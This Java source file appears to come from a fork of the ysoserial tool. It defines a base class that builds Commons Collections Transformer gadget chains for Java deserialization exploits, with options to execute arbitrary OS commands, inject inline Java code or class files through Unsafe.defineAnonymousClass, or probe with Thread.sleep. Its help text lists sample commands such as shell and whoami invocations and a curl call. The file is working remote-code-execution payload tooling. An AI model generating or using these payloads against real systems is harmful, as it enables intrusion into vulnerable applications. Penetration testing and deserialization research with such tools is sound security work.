package ysoserial.payloads;


import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.cli.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ClosureTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.TransformerClosure;
import ysoserial.Strings;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Gadgets;

import java.io.*;
import java.util.Arrays;

public abstract class ParameterizedTransformersObjectPayload<T> extends ParameterizedObjectPayload<T> {
    private static final Options CLI_OPTIONS = new Options()
        .addOption(Option.builder()
            .argName("sleep")
            .longOpt("sleep")
            .desc("Generates a Thread.sleep gadget payload")
            .build())
        .addOption(Option.builder()
            .argName("sleep-delay")
            .longOpt("sleep-delay")
            .hasArg()
            .desc("Sleep delay in milliseconds for the Thread.sleep gadget payload (defaults to 10 seconds)")
            .build())
        .addOption(Option.builder()
            .argName("single")
            .longOpt("single")
            .hasArg()
            .desc("Provides a single command argument (old behavior)")
            .build())
        .addOption(Option.builder()
            .argName("inline")
            .longOpt("inline")
            .hasArg()
            .desc("Java code block to inject inside the gadget chain")
            .build())
        .addOption(Option.builder()
            .argName("inline-file")
            .longOpt("inline-file")
            .hasArg()
            .desc("Path to file that contains the Java code block to inject inside the gadget chain")
            .build())
        .addOption(Option.builder()
            .argName("class-file")
            .longOpt("class-file")
            .hasArg()
            .desc("Path to the pre-compiled class to inject inside the gadget chain. Do not forget to add a static block initializer. The class name will be randomized")
            .build())
        .addOption(Option.builder()
            .argName("help")
            .longOpt("help")
            .desc("Print this message")
            .build());

    @Override
    public String getHelp() {
        String header = "Payload based on commons-collections:3 Transformer chains\r\narguments:";
        if(this.getClass().getAnnotation(Authors.class) != null) {
            header = "author(s): " + Strings.join(
                Arrays.asList(this.getClass().getAnnotation(Authors.class).value()),
                ", "
            ) + "\r\n" + header;
        }

        String examples = "examples: \r\n"
            + this.getClass().getSimpleName() + " -- /bin/sh -c 'id>/tmp/result.txt'\r\n"
            + this.getClass().getSimpleName() + " -- cmd.exe /c whoami\r\n"
            + this.getClass().getSimpleName() + " --single 'curl hxxp://foo.bar'\r\n"
            + this.getClass().getSimpleName() + " --sleep --sleep-delay 15000\r\n"
            + this.getClass().getSimpleName() + " --inline 'System.out.println(\"Hello world\");'";

        HelpFormatter formatter = new HelpFormatter();
        StringWriter sw = new StringWriter();
        formatter.printHelp(new PrintWriter(sw), 80,
            this.getClass().getSimpleName() + " [flags] -- [arguments ...]", header,
            CLI_OPTIONS, formatter.getLeftPadding(), formatter.getDescPadding(), examples,
            false);
        return sw.toString();
    }

    private byte[] compileClass(String inlineCode) throws CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.makeClass(Gadgets.generateRandomClassName());
        clazz.makeClassInitializer().insertAfter(inlineCode);

        return clazz.toBytecode();
    }

    private byte[] createClass(InputStream is) throws CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.makeClass(is);
        clazz.setName(Gadgets.generateRandomClassName());
        return clazz.toBytecode();
    }

    private Transformer[] defineClass(byte[] classBytes) throws ClassNotFoundException {
        return new Transformer[]{
            new ConstantTransformer(Class.forName("sun.misc.Unsafe")),
            new InvokerTransformer("getDeclaredField",
                new Class[]{ String.class },
                new Object[]{"theUnsafe"}
            ),
            new ClosureTransformer(new TransformerClosure(new InvokerTransformer(
                "setAccessible",
                new Class[]{ boolean.class },
                new Object[]{ true }
            ))),
            new InvokerTransformer("get",
                new Class[]{ Object.class },
                new Object[]{ null }
            ),
            new InvokerTransformer("defineAnonymousClass",
                new Class[]{ Class.class, byte[].class, Object[].class },
                new Object[] { String.class, classBytes, new Object[0] }
            ),
            new InvokerTransformer("newInstance",
                new Class[0], new Object[0]
            ),
            new ConstantTransformer("")
        };
    }

    /***
     * New parameterized chain
     * @param args arguments to pass to the gadget
     * @return generated gadget chain
     * @throws Exception if error occurs
     */
    final public T getObject(String[] args) throws Exception {
        Transformer[] chain;

        CommandLine cline = new DefaultParser().parse(CLI_OPTIONS, args);
        if (cline.hasOption("help")) {
            throw new IllegalArgumentException(); //print help
        } else if (cline.hasOption("sleep")) {
            long delay = 10000;
            if(cline.hasOption("sleep-delay")) {
                delay = Long.parseLong(
                    cline.getOptionValue("sleep-delay")
                );
            }
            chain = new Transformer[] {
                new ConstantTransformer(Thread.class),
                new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"sleep", new Class[]{long.class}}),
                new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[]{delay}}),
                new ConstantTransformer("")
            };
        } else if (cline.hasOption("inline-file")) {
            StringBuilder code = new StringBuilder();
            BufferedReader reader = new BufferedReader(
                new FileReader(cline.getOptionValue("inline-file")));
            String line;
            while ((line = reader.readLine()) != null) {
                code.append(line).append("\r\n");
            }
            chain = defineClass(
                compileClass(code.toString())
            );
        } else if (cline.hasOption("inline")) {
            chain = defineClass(
                compileClass(cline.getOptionValue("inline"))
            );
        } else if (cline.hasOption("class-file")) {
            chain = defineClass(createClass(
                new FileInputStream(cline.getOptionValue("class-file"))
            ));
        } else {
            chain = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                    new Class[] {
                        cline.hasOption("single")
                            ? String.class
                            : String[].class
                    },
                    new Object[] {
                        cline.hasOption("single")
                            ? cline.getOptionValue("single")
                            : cline.getArgs()
                    }
                ),
                new ConstantTransformer("")
            };
        }

        return this.getObject(chain);
    }

    /**
     * Generate a new gadget chain from this transformers chain
     *
     * @param transformers The parameterized transformers chain
     * @return generated gadget chain
     * @throws Exception if error occurs
     */
    abstract protected T getObject(final Transformer[] transformers) throws Exception;

}
